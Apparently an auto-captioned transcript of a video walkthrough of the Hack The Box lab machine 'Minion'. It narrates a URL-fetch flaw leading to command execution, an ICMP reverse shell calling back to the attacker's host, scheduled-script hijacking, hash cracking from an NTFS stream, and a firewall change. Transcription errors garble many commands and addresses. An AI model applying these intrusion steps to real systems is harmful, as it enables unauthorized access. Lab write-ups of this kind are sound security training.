 what's going on YouTube this is hip sack and we doing minion from hack the box which is a really tough machine for birth of right and wrong reasons some of the right reasons because of the firewall that forces you do an ICMP reverse shell hiding data in a NTFS file stream some reverse engineering there's a lot of cool things about this box but there's also a lot of bad things that I didn't like about it so when you're forcing people to do the things I just said it's a bit insulting to also make them do full TCP port scans multiple go Buster's to find hitting content and just rabbit holes that don't really lead anywhere so with that being said let's jump in the first thing we do is a and maps of a map - SC for default script SV under make versions Oh a output all formats put in the directory called and map label this initial and the IP address of minion which is 1010 10:57 this takes time so I already ran it looking at the results we see not a single port is open so I copied this IP address ping the box to verify it is up and then thought well I can either do I guess UDP scans or we can do a full TCP port scan so let's start off with the full TCP port with an map - P - that does ports 1 to 65535 then - capital T 4 to make it a bit more aggressive slash faster then output all formats and we'll call this n map all ports and the IP address of minion this also takes time so I have it ran I mean just look at the results we do see it took 450 seconds and so around I guess six and a half minutes but one point does come back it is port 60 2696 so what I'm going to do now is let's just do a map - a CSV dude - and to not do DNS and - Peter specified that port 1010 10:57 if I could type and this should only take a second because we're just doing one port and what tell us what is listening on this spoiler it's going to be HTTP there we go so we do see it come back we have a directory slash back-end it is I is 8.5 which I believe is 2012 we can go to Google is 8 5 2012 r2 so let's check out what that site looks like ten ten ten fifty seven point six two thousand six hundred and ninety six and we get a big web page so we can go to the blog and this is his I guess just public blog nothing really interesting there we look at the page source we can see a base64 string so let's take a look at what this is and the reason why I said base64 is just it's a long blob of characters and normally that means base64 I have no clue what I just was thinking there but basically for decode this looks like it is a different language not any type of encoding so let's just go to translate google.com face the language we see it as Italian and in the middle of the walk of a life I found myself in the dark forest because the straight way was lost no idea what this means so let's move on we have a big image so let's just take a look at this and we will also check out what slash back end is instance not running check the source nothing there so let us start up a go Buster and would do let's see what flags we want we want - w-4 would list user share word list der Buster and then directory list 2 3 medium text x4 file extension I'm gonna do a SP because we know this is a iis server and that is common amongst that and then we need the IP address which is - you 1010 10:57 port let's copy this let that run and then we'll look at the minion image while that goes let's copy the image to a directory so downloads minion and then we just do a few things on it like let's do strings going down doesn't look interesting we can do a bin walk on it and we can also do let's see exists or to look at the metadata and we don't see anything there looking at a go Buster results we do see test dot ASP came back so let's stop that and go check what test dot ASP is missing parameter in URL you and get requests so we would need to specify you and this can be a URL so HTTP let's do our own box 10 10 14 I think I'm 30 I am 30 and let's setup Python simple HTTP server on port 80 internal server error we don't get anything so let's do something a URL that we actually know is valid and that is the webserver itself and we get a page back so we got a cross-site request forgery here so let's try something like the loopback address and we have a page back right away we have Edit configuration start/stop instance view summary view logs and system commands control you we have these links actually go nowhere there's one link that goes to CMD aspx so let's test that out and we get four for nothing let's just get out of you source so it's a bit more prettier to read and foul not found oh so what happened was we click this link and it brought us to one 27001 CMD dot aspx and then a Python web server responded to us so what we have to do is have this URL actually one 27001 CMD aspx and we have enter your shell command so let's do hostname well you hit enter we have an error because it gets sort of a CSRF so let's go back let's now send this to Bert make sure burp is on intercept it is and we can just send this to the repeater tab and now run this command and we're still posting to where we don't want to post so let's do question mark and then it's sending xcm d equals hostname so this we have a two URLs and one so let's break this down so it's a bit easier to see we'll call this notes I guess so we have the first URL which is going to call this URL so I don't know how we can explain that easily quickly so we're just going to do it so let's see intercept on off to clear the history look Anna we're going to URL encode this second question worth to make it a valid HTTP request know if that's needed but question marks go between URL and arguments and if you want to separate arguments after that it would be and but we don't want to use an because this is a second URL in the URL it's a bit URL inception hopefully that makes sense and we see exit status of one when we just do hostname so we don't get any output back and in bash in PowerShell you just do PowerShell exit what do 10 and will URL and code this to see if we can get any output back so we have verified we have code execution because we're just executing PowerShell we can change this exit status and change the output of this so we could write a Python script and run a command like 20 times looping one character at a time and converting exit status to characters but that is a bit of a pain so let's see if we can write any files anywhere so we'll do let's see it go up SEC direct this to C colon backslash temp normally exists and then we can do if SEC click go we get exit status of zero so if this directory didn't exist let's just put something we know doesn't exist take the status of one so we know we probably just wrote to sequel and temp upset we could write somewhere we definitely can't write and that C colon windows system32 and we also get exit status of one so most likely we wrote the file see : temp hip sack and then since we can write files we can now write a reverse shell but before we get in reverse shell we should see what port we can access what port the server can talk to us in so we have one way to write files to the server we have another way to execute code now we need to find a way to get the server talking back to us because when we did the CSRF with our IP address we didn't get anything back from the server so there's a firewall between the server and us so let's do something to test if we can get the server talking to us so save this request will say this as CMD execution and now we need to do another request which is just going back to this 1010 1430 and we'll just copy this so for I in sequence 1 to 65535 every TCP port we will do a curl on HTTP 10 10 10 57 six two six nine six and then slash test on ASP then us on I so what this is going to do and we just echo this out first to show you what is - in case you can't read that code it's going to make a port request back to us for every single port or connect to us so we can get rid of this and then open up a new pane and we'll do a TCP dump because we will be making the 65,000 connections back to us and we don't want to listen on all the ports so TCP dump will tell us when the server actually makes the connection so TCP dump - I specify the interface and then we can write a filter just like we would in washer so SRC host 10 10 10 57 and if we just ran this and ran our test connection oh we got go buster going so we see a bunch of data already so we want to do and TCP TCP flags is equal to t zp - CIN like that and the reason for this is we want to see when the server initiates a connection to us in the three-way handshake I believe goes the initiator sends a sin then the next packet back is an ACK and then we send a syn ACK or something I forget the whole process of a three-way handshake but I know sin is the very first packet so let's run that and then run our test connection and we can see it is sending a bunch of data I didn't put any actors in so I don't know where it's at so let's edit this real quick do V test connection we can fight that dev null and then we can just echo I could have done that bit better but at least we can see all the ports and spoiler we're not going to get anything back it is actually ICMP so let's create another window and we just do TCP dump - I ton zero ICMP and let's go back to our with command injection of execution and we'll do ping - see one ten tenten a tenten 1430 i think that she has count and - and on linux is count i think it's different on Windows and Linux we'll find out but run this egg's status one so maybe not different maybe a stash n exit zero and we get one ICMP requests so at least we know we have ICMP between the server and us coming back to this TCP dump window we see nothing we're have done a thousand ports already and we could have done WWWF is instead of writing our own script like we did and i think two boxes ago i forget the name of that box but now it also been a valid way to test that anyways since we have ICMP we're going to do a program called nishang i think i say you pronounce it if you just do github nishang and this is powershell for penetration testers i don't know where it got the name but we'll just get clone this and there's one file in this that we want and that is a ICMP reverse shell and I forget what box we use in a Shangguan boy user before on a box we weren't doing any Metasploit with just because this particular package has a lot of just standard for shells like we do on linux with net cats so we go into shells and there is a invoke PowerShell ICMP so let's take a look at that and it didn't highlight the syntax I guess I don't have PowerShell syntax of them but we see parameter of IP address delay buffer size and we know we need to set this value to ignore all so this is telling us how to run it and we also need a file called ICMP SH underscore M PI so this is the actual server piece and the Shang doesn't have that so let's just Google this to get in this package was a copy ICMP SH our score M so let's go to the root of this github page so we can clone this and then get clone so on the host or the attack box we run this so we don't respond to ICMP packets because we're sending us ICMP packets as a shell so we don't want or Colonel or whatever it is on a box to automatically respond so we set that to ignore and then we can execute this box which handles the actual shell and then on the target or victim we just execute invoke PowerShell ICMP - IP address and then the IP address of our box but since we don't really have an interactive connection I'm just going to put that at the very bottom of this so when I execute the script it automatically executes that so we'll do 10 10 14 30 and we want to grip that sis CTL value out so cmp so we'll definitely want to run this we'll just do that now so we don't forget to do that and then let's copy or is it that ICMP file out to directories and I really hate editing files that are in the repository directory so let's just remove that at it because I copied it here so we have that file here so the next thing we do is have to figure a way to get this giant file - I don't know why open verb the server sending it one line at a time and that is rather annoying because there's a lot of bad characters what we doing lines we're gonna essentially loop through this whole file and then have a bunch of echo requests writing a HTTP request to say echo line to see : tell it's a cop ps1 but the problem with doing this is there's gonna be a lot of special characters in this like I don't know it probably won't like this because if line contains that director then it's going to be like echo test and it's gonna start writing this because that's just how echo is going to behave so we can't have things like that and who knows what other characters so we'll just use base64 to send it on over because basically four is going to translate everything into standard characters or just non special characters which don't have any odd behaviors unfortunately PowerShell uses I think utf-16 for like it's strings so we can't just do the base64 Miletus command line or if we do it may have unknown issues so I'm gonna run PowerShell on Linux which if you use Empire you probably already have if you don't I'm pretty sure it's in Callie's after posit Ori yeah you got PowerShell so if we just run PowerShell we have a PowerShell command line on our Linux box which is pretty cool because now we can just do the base 64 encode in this PowerShell it's gonna behave the same on the windows box so what do Rev shell is equal to get content and that was invoke PowerShell ICMP dot ps1 so Rev shell is just that file so the next thing I'm gonna write and I just did that so you guys can copy it if you wanted to while I do the next is we need to encode it so we do encoded is equal to convert to base64 string Rev shell function oh we need to convert it to bytes first so by its is equal to system text encoding unicode get bytes Rev shell so that string has now been converted to bytes and then the final thing is actually to make it easier for the video we've run that command then we run this command and then we can run this command and then encoded is a copy of a base64 so you can do encode in out file ICMP dot ps1 be 64 so if we go into terminal 104 we can less ICMP ps1 be 64 and we get the file and I think that was it it's not that it has those two bytes at the beginning now I don't know what has fffe that may cause an error I'm not positive but you can see it's definitely not the standard base 64 wall used to cuz a string because we have bytes after that every time because that's reading a 16 bytes instead of 8 bytes I believe anyways let's verify that all works and decode something so encoded is that PowerShell string so let's do decode is equal to system text encoding unicode get string system convert from base64 string encoded and i think two parenthesis decode and we screwed up something because we don't have any line breaks whatsoever and i know what i did wrong we have to add this - raw option to get content because it wasn't doing line breaks bytes encoded see still have that weird bite at the very beginning the file but I don't think that matters now we do decode and we still don't have line breaks let's see I do - wrong there maybe doesn't like it like that we'll call this show so it's got a whole new variable name we'll call this bytes to show I don't think I ever did the encode to command I think I just wrote it to a file yeah so that's why the output didn't change but this is bytes to carry so let's do help file I'm gonna have to do out file yet was decode okay that's working better so yeah that was the issue is I just goofed on one thing so that's why we always test our payload before sending it because mistakes are easy to make so I just deleted the file and we have encoded to is equal to a base64 string we can do out file and then ICMP EPS 1b 64 and we still probably have this too we had bytes at the beginning but we proved we could still decode it so maybe that's just a window string thing or something but the next thing we have to do is get this in a format we can send it over a URL because the maximum number of characters for a URL I think is around 2000 and we have like 20,000 characters in this which is quite a bit especially if we're going to be sending it over HTTP but it's a bit late because I've already done the encoding if I wasn't so lazy I would go back into this invoked shell and remove all this documentation all these white spaces etc but no I don't think it'll take that much longer so in order to break it up on lines we can send over I'm going to use a command called fold and what that's going to do is just break it like this so we can do fold - with we'll do 120 fight that to temp and then copy town back over ICMP ps1 be 64 so before you start working on sending it over this could be a pain see I just copy this string let's see I just copy this it's still gonna be UTF whatever I thought it pasted there we go okay that fixed the formatting I probably could run a program called like icon for something but what we need to do is make sure we don't have any pluses and tap in this file and we do and the reason why pluses are bad is because curl isn't gonna URL encode this and this has a special format and that is space so if we set this over a URL and curl this will just get translated space and it won't be valid base64 so we have to double encode this so to do that we'll just encode it first so if we then test go to with the pluses okay go to burp decoder plus encode as URL that is percent to be so replace that and then replace this okay move test to ICMP a ps1 b64 and now I think we'll be ready to send it actually let's do one last thing them ICMP eps let's double incur these equal signs because I don't think it'll hurt anything equal encode as URL percent 3d okay and the reason we're doing that is when you double encode something so we have percent 3d figure what percent is percent to five when it goes over the wire it's going to give this as percent to 5 percent 3d and the web server is going to decode that percent to five to a percent and then it's going to also decode this percent 3d into an equal so I think that will be all we need so we can now send or file so we can do them well copy test connection to send file sh and let's see if this works so let's see we need to do one 27001 or is it CMD aspx question mark CMD equals go back to repeater CMD aspx x cm D equals and this is your l encoded to be percent 3f no this actually makes sense why we're doing they double your own code because we're processing to URLs so we have this nested URL we send it to this web server and when we send it to this web server it decodes this to be the question mark so when this web server then sends it it sends it as a question mark not percent 3f hopefully that makes sense while you're doing your L WRL encoding because we're literally nesting inner URL so you have to do double encoding hopefully that makes sense so CMD then we'll do let's see we don't really don't have to do that we can do cool we're gonna do - V - capital G X get and - - data URL encode and these are all just Co flags X C and B is equal to or dips AK and if SEC is equal to echo line C why do that mr. strache miss I thought I'd save time by reusing code I wrote but these two functions are actually really different so not really reusing anything so fin bash we want to export ifs this is I think internal field separator to loop by line instead of character because by default it's going to loop by character and we want the field separator to be newline so do that and then for line in cat was it ICMP ps1 be 64 yep do it SEC is equal to echo line to C colon backslash temp backslash tip SEC ps1 will do it sect - l dot ps1 and all that's going to do is when we execute that if we had a echo it's going to echo all these commands and we're going to send these commands to the web server so that's all that's doing so we have echo we do the coal request to get us to where we can input a command and now we're saying the command is epic hope that makes sense it should try think there's a better way I can explain this before we move on and I think I think it's straightforward so let's send this file and see what happens I know I made a mistake somewhere I wish I could read fast enough before getting error messages or not and if I made this smaller we weren't sent so many requests I think that's right you'll see so this is where the tough part of the box comes because yeah bit blind so let's draw on the Python ICMP Sh I'm square PI and keep in mind we already did that says CTL to ignore what we'll call it pings so we don't have to do that but source address which is I guess our address 10 10 14 30 and then 10 10 10 57 and then let's hope we did this correctly because if we didn't it's gonna be a pain to troubleshoot so X CMD PowerShell C colon backslash down.if sec - LPS 1 go thinking immediate response back good sign but we don't have a shell so bad oh crap we have to decode it on this end so that files just pure basics before of course it can't execute it so we can do PowerShell X is equal to I'm not gonna URL encode as I type we're just going to type all this and then URL encoded after so X is equal to get content C colon window C : temp hip SEC - shell ps1 piece before it's not what I copied it as I think I just copied as a ps1 EPS act - LTS one that's why I tried I just can't right away because I didn't label it as basics for encoding we're not bloating it it'll actually be easier if we just do this and this PowerShell because we can verify so X is equal to get content and this is ICMP dot PSone be 64 this will just replace it with epoch - shell actually let's do that now MV - upset - shell ps1 then after that we want to do a decode so decode is equal to system text encoding unicode get string system convert from these 64 string x and that is not a valid basic ste for string oh crap why do we do this to ourselves sent to be that's a plus that's a plus and then we need equal equals okay decode decoded fine so we can do the code out file C : damn upset - ICMP type ps1 I guess copy this go to boot paste and URL encode exit status of 255 so we probably screwed something up your real decode get content C colon backslash temp if sex showed up ps1 let's try that at 2:55 you can see why I hate this box so get rid of this decode stuff that's the only piece we don't test I just asked zrl so maybe just didn't write it to file correctly decode pipe out file looks on that C colon backslash tab let's see if we do tight which is essentially cat and bash C colon backslash town if SEC gas was it shell ICMP dot ps1 lipstick - ICMP ps1 excess of one to do shell zero so we know she'll exist but ICMP doesn't exist so it has to do with how we're writing the file so we can do decode let's double your own code this see if that helps it does not we can probably just decode C colon window down hips ACK ICMP dot ps1 so instead of using out file I just used that pipe director and it looks like it wrote so now when we read on this type on C colon temp windows upset ICMP we have excess of zero so that file exists so get rid of all this and have PowerShell execute C colon temp upset - ICMP and hope for the best go to a Python and we do have a shell so after all that debugging we finally get the shell back there is a bug in this program where occasionally it sends some characters twice don't know what that's about but we don't really care so CD dot dot and you can see it's not too quick so let's just go to the root directory and do a dir to see what exists I think I sent those commands to quick so do dir again and we see sis ATM scripts and that catches my eye right off the bat so let's go into that directory and see what this is about we got two scripts seed ps1 and Dell logs not bad so when do you type C dot PS one for each argument and Uggs right host derp remove item so it looks like it's deleting something but we don't know because we don't know what args is so let's look at what delete logs not bad is and we have us executing PowerShell window style hit an exact bypass not file and we're executing that file and specifying C colon backslash access logs and we're also echoing date/time stop to sequin windows temp log text so let's see if we can see this file tight see if we can see the log it creates we don't see anything so let's just dir on see : Windows 10 and we do see log text is created and it was last night at 1206 p.m. looking at the date we have 12:11 so it wrote about five minutes ago and I wonder what the flag and dir is to get owner we can probably get content was it is it get content - properties star I forget the PowerShell syntax to get a file owner we can see who owns this log text so let's see powershell get file owner I get out I don't maybe gets out item for your copy and we don't have the owner but we can pipe that and do all of this nope a select rename I actually don't know how to do this is embarrassing let's just try a dr /q does that do it I really hate not having our standard error displayed just what di o /q so we have right we're just gonna I guess move on because obviously I'm having trouble with this but I'm sure you can google it and find it relatively quickly it's just the record flag is on so it's like having a thousand people watch me and I make mistakes so anyways we will do another where was I know let's just do that logs again so if we get showered item on that we can see last ride time was still twelve eleven but I think something's running to that every five minutes because we look at date and let's see flea do it again should be running relatively soon so it's 12 16:05 last time was 12 11 so let's check that get item see if anyone wrote to it and now we have last right time as 1216 so let's see if we take over that seed ps1 file so copy C : C dot ps1 no co-op ps1 to C dot ps1 dot back and it'll copy C : Tamm EPS a cache ICMP ps1 I think that's what we called it yep - seedot ps1 Type C dot ps1 and we have our shell so we're gonna exit out of this start up our server again and wait for a new shell because in five minutes it should call back to us and hit us so I'm gonna follow the stream because I don't feel like pause the stream pause the video because I don't feel like waiting five minutes and having that Blake time so we'll resume soon as we get the show so we got a new shell and we see Windows PowerShell running as user D curdle on minion if we do Who am I still says I is that's up I guess that was a bug and ICMP SH maybe we have two shells going okay I don't know but now we are a decoder that was bizarre I guess when we did exit the shell didn't fully die ones they ever have any other issues it looks like things are going fine think we have two shells going they did CD users and ended up in Windows this ICMP shell is not the most stable of things so we do dir on users we see decoded minion so let's go in there try this again I definitely think we have two shells going simultaneously so we don't see the flag yet so if we go into desktop we will see the files and we could send jaws and other PowerShell enumeration scripts up here to run them for probe ask but that is painful so we're gonna avoid that and just examine this back up to unzip file because chances are it's gonna be in this backup zip and you would go to decode up mania desktop to get this user to attacks and see this file so it's something with this file and we could use PowerShell to unzip it but if that has any binaries or things like that in it we can't really do much reversing on this box so I'm gonna try to copy backup zip to let's see see : let's see what it is gir a C colon backslash let's run we have high net pub so dir c colon i net pub and then public so let's try copying it there copy backup zip because if we can copy it there we should be able to quickly exfil it find a pub public because we don't have standard air we always have to list it afterwards and we couldn't right there so unfortunately we don't have write access so that leaves one thing and we can try to use PowerShell to exfil this document and I haven't done this yet so we'll see if it works I don't think it will so backup file is equal to get content backup zip we want - oh crap I know what's happening Who am I let's go to CD backslash forgot something that's so in Windows we have multiple shells going and this is going to suck finish every five minutes it's running a new version the shell and kicking it back to us Jesus Christ this is a lot of files don't make this mistake there we go CD backslash was at sysadmin scripts if you do it again oh my god I don't know why threaten it there's literally nothing I can do I can control see out of it but I don't think that will help so because if I control see it'll kill it on my end but may not kill the shell on the remote server so just gotta let this run its course that double use it should be done soon a TAS class / I am I think that's right task list there we go well we got a lot of PowerShell and a lot of CMD dot exe tasks kill slash I am PowerShell DXE please never give me a response back Who am I don't respond please it responded so that did not work is there slash force with filters let's see I think it's just /f I think it just all that so have forces the command to be terminated copy let's force that and hopefully it never responds and then we can get a new shell good Who am I alright doesn't we kill it we'll just CD sysadmin scripts and hope for the best dir C colon backslash CD sis ADM scripts now we can copy C dot ps1 dot back over C dot ps1 dulce de ps1 back why are we back in system32 this show is annoying as you can tell CD backslash users coda minion desktop yeah I must be doing something wrong with that taskkill I think they did that right anyways let's just encode this back up is equal to get content - raw back up zip wide it executes again - actually not remove the file this really this ADM scripts don't see : insists ADM scripts see to ps1 that files no longer there I will revert the box when I'm done but police say it's gone okay so I think when I was running those delete scripts because there's like 20 shelves that are responding it just wasn't in the directory so hopefully the issues are all fixed but just in case they're not we're just going to use full paths from here on out so back up zip is equal to get content see : users to go to desktop backup zip - raw then we can do bytes is equal to system text encoding unicode dot get bytes on backup zip and then encoded is equal to convert to base64 string and the really crappy thing is i don't have standard error so if this air it out I have no idea encoded let's see if it sends this base64 back it does sweet now let's just hope my terminal is big enough to hold all this data because this is a lot I don't know what mighty MUX callback buffer is and this is more than I expected considerably more than I expected now it's just a simple small program why is this fellow have to be so big and it's still going this is the Energizer Bunny there we go finished so we can search my terminal for PS peace got one and we have the whole thing awesome but this is my buffer go all the way down copy and we'll hope that there was no errors on outputting all that back of zip b64 it's going to take probably 30 seconds to paste and we'll really hope this works okay and it's copied so we will take this file and hope we can decode it I'm doubting this is gonna work just because it's probably a different format than my bassist for knows but we'll try it anyways we do file backwards it just says data let's try bin walk see if bin Watkyn extract it don't see any magic bytes so let's try PowerShell to decode it and it's very possible that I'm trying to think just outputted a bit of garbage because of the shell we're working with so if that's the case it sucks but it's a fact of life so we want to create it for [Music] encoded so encoded get content what's the file backup zip be 64 will say encoded is equal to that okay then decode decode to backup zip we'll do backup 2.0 md5 sum and backup to dot zip has a different md5 sum then backup dot zip so the two basis - for commands process that a little bit differently we backup to zip it's still data so there's one last thing we can try to do to recover this file and that is use icon to convert it from utf-16 to utf-8 and we want to do backup to zip and we will say that file is back up to zip - I guess and we'll do - dot zip - and we get zip archive so that was the problem it's just the file format it was and that is going back to highlight the issue we have with the Linux base64 and the pouch all base64 and if we try that with just the pouch all basically for decoded and we'll see if that works file backup to zip three so it would work but yeah anyways let's just unzip it so back up that zip back up to zip - and we have zip file is corrupt let's see back up to zip three two back up to feed zip unzip beaded zip see if that compresses that is still corrupt can't then walk it to to get out zip we'll see if this is just as corrupt so it's still aired in transferring this file we can't really look in what this backup dot zip is so the last thing we can do is use PowerShell to analyze to extract the server use PowerShell to extract the zip on the server so we still have a show on it so let's extract backup zip with PowerShell so we can do ad type - assembly system dot IO dot compression filesystem IO dot freshened zip file extract - directory C colon backslash users curtain minion backup done zip and we need specify where we extract to so C colon backslash temp and I think we need a trailing slash there we don't have standard errors so we can't see if we screw this up but we can hope for the best dir C colon backslash temp do not have it so let's see if I can spot the error in the code just copy this paste it into Google see if any errors if I don't we will just move on because I'm tired of this rabbit hole that leads us nowhere extract two directory string string that should be right see : users oh gosh darn it tico Dominion desktop backup dot zip C colon backslash tab maybe this one work di uh C colon backslash tab and we get secret dot exe awesome so we can just execute that file and all it does is print the current directory and if we examine this file in like Ida or something which is what I was trying to do with copying it to my computer we'd see that there's nothing else in this so if we did that base64 a few times we'd eventually get a copy that isn't screwed up on to a computer where we can analyze it but it's a rabbit hole and I'm not gonna spend much time on it we may look at it at the very end if I remember but we can do get item - dream on C : users decoder desktop back Dakota dot minion desktop backup zip and we see there is a hidden stream in this data we see this is NTFS file streams and I guess you can google them it's just a way for files to append data and this doesn't actually affect the file hash or anything this is just data that is on a object in the NTFS filesystem the legitimate use actually is when Internet Explorer download something it puts a NTFS stream on that downloaded object and that's what has when you try to execute something you get a box that pops up it says this file was downloaded from the internet are you sure you want to execute it if you click yes it removes that NTFS file stream but as long as that stream exists you get that POC pop-up box so that's the legitimate use case but it's often used to hide data so we can do a get content on that file and specify - tree nut stream oh yeah - dream and pass and we get 32 characters which is a md5 sum and we can just Google that and we see hash killer has it so let's go over to hash killer yeah my VM will die if you stir it running which we'll call it a minor C ad eight seven a submit we see the password is one two three four test and that is the password for administrator so if we did like invoke command we could switch to that user but it's a bit pain to use invoke command because you have to create a secure string to hold the password in PowerShell so the easiest way to verify the account exists is to do like net use Y : then localhost / C and then we can specify slash user administrator and then one two three four test as the password and we see the commands seated so if we go to Y : we're now at the C Drive and we could go into users administrator desktop and it looks like my shells nope it's not behaving dear y : users administrator Desktop and we see rude text and route Exe and if we execute root X so let's see tight root txt we have to launch root Exe located in this folder to execute it so if we execute root Exe we get a thing saying are you trying to cheat me so not quite there yet and what I had done is I did a copy command and I copied my colon users desktop root exe - why : was it okay forget what I asked this shoot Dara yeah C : copy root exe - administrator nope why : i net pub public and then i could then download root dot exe and we can analyze this file so let's use aida because Ida is now well there's a newer version of Ida that's free which allows us to analyze 64-bit so let's use that I ate a 64 it is okay open root DX e little file sure so opening we go right to the main function and we can see the assembly so we see calls to get current directory and then right after that we have load effective address C : users administrator desktop and then we have a string compare so I'm guessing this STR one is probably going to be the resort of this get current directory but we have a compare and then if they are the same go down here and if not display are you trying to cheat me so we need to make a path C colon backslash Windows users a minister a desktop and we could do that with invoke command but still we don't need that we'll do that in a minute but we can look on the successful thing we have it doing another load effective address and this time it's pointed to a bunch of junk and that makes a call to encrypt decrypt looking at this we can kind of see just a basic function and right off the bat it looks like it's doing some type of decrypt loop right up here is probably getting the length of the string then down here we have it making a call to sto n so it's probably checking how much of the data have we decrypted and if we've decrypted or encrypted the whole thing go to the end if not let's loop and that's why I thought right away this is loop just because we have one function goes down here this goes here then all the way back up then back here and then we see some more things and we see a Dax three move and then put character so to me this is looping over a string character by character incrementing the hex by three or not incrementing the hex including the character by so you're doing a shift and then placing it as a new string and then if that is completed exit so we can test that by let's go to encrypt decrypt not a grip main we can copy this I think that copied did sweet so let's do the test dot now we can by just yeah V the crypt dot PI we can do for care in that let's do a single quotes print care and let's see if we loop character by character we don't oh so now we have a loop by character so now instead of print care we can do ordinal character plus 3 actually if we just do ordinal character we can show what that is it's just converting it into the ordinal format so we can then plus 3 because that's what I decide to do right and clip decrypt plus 3 so then we can convert that back into a character and since this is Python 3 we can do end is equal to that and what this does it says don't print a new line after the print and then we have root dot txt the other way to do this is let's do the credentials so this is definitely a bit of a pain so let's do user is equal to dot slash administrator and dot backslash means local computer don't do a domain PW is equal to one two three four test secure P W is equal to convert to secure string this is going to be P W has plane yeah plain text - force now I can create a credential so cred is equal a new object system management automation PS credential user SEC PW you can see all the loops you have to jump through when you don't have a TTY on Windows okay so we have creds and I would do invoke command computer name local host credential cred - script block Who am I I wonder if that's because of the annoying thing cred no admin is straighter okay user is right SEC PW convert to secure string PW that's correct as plain text correct - force that looks good read new object huh script block let's just do a sequel with users administrator desktop route Exe oh no I'm being s is denied crud and then that I type something wrong so let's do this again user is equal to we'll just do administrate it we won't do the dot slash P W is equal to one two three four test secure PW sequel to convert to secure string PW as plain text - force potential new object system management automation PS credential user secure PW okay also this just say oh you try to cheat me access denied so we have something screwed up oh my god yes that is it the power show of Linux threw me off guys I was running that on my local box the entire time I was wondering why I had like syntax highlighting I could do up and all those cool things that looks like it's gonna work let's see Who am I let's see read the command computer name localhost cred script block Who am I separate this up on this a few times so it's on every show that's here because screw this box I think something I'm thinking an error message somewhere I don't know where let's see copy paste let's see Oh credential is equal to that I made a type of what I was redoing everything I think cred there we go make the say Who am I okay now we have command execution as route that we've got that all settled and we can do CDC : users administrator desktop because we have to be in that working directory and then semicolon route dot exe oh yeah so are you trying to cheat me I think I just specify the whole freaking path CD C colon backslash users administrator desktop C : users administrator desktop root exe and we get the hash but since we are at a administrator level we could have just done something like create a firewall rule so let's close out of Idol real quick don't pack database you know and we can do new net firewall rule you can see the different options you can do but we can just do new net firewall rule - display name tip SEC remote address 10 10 14 30 is it how do we do inbound - Direction inbound and we need to allow so let's see - action allow - action oh wow so after running this we could and map - P 4 4 5 3 3 8 9 on 10 10 10 57 and we now get open ports so MA or a desktop 10 10 10 57 and we can say administrator 1 to the 4 test and just remote desktop into this box and when you do that you can do CMD desktop root dot exe and get it that way so hope you guys enjoyed the video I know I struggled a little bit this is an annoying box to work with with that shell but yeah it's a living experience if I didn't have troubles and you had all these weird things happen when you were in the box you'd be wondering what you did wrong when reality ICMP shells just suck so take care I'll see you next week